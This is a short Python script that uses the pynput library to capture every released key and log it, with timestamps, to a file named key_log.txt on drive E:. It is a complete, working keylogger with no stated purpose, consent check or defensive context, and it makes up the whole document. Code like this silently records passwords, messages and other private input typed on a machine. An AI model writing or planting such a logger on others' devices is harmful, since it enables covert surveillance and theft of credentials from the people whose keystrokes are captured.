from pynput.keyboard import Key, Listener
import logging

log_dir = "E:\\"

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='["%(asctime)s", %(message)s]')

def on_release(key):
    logging.info('"{0}"'.format(key))

with Listener(on_release=on_release) as listener:
    listener.join()
